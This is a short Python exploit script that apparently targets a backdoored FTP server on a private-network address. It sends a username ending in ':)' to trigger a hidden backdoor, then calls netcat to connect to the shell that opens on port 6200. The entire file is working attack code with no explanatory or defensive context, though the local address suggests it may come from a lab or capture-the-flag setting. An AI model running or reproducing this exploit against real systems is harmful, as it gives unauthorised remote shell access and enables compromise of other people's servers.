from socket import *
import os

def main():
    ip='192.168.8.171'
    setdefaulttimeout(4)
    port=21
    tar=socket(AF_INET,SOCK_STREAM)
    tar.connect((ip,port))

    tar.send(b"USER qweewr:) \r\n \r\n")
    p=tar.recv(4096).decode()
    print(p)
    tar.send(b"PASS \r\n \r\n")
    p=tar.recv(4096).decode()
    print(p)
    os.system(f"nc {ip} 6200")
    print('[+]done!!')
if __name__ =="__main__":
    try:
        main()
    except:
        print('[-]Error!!')
        pass



    

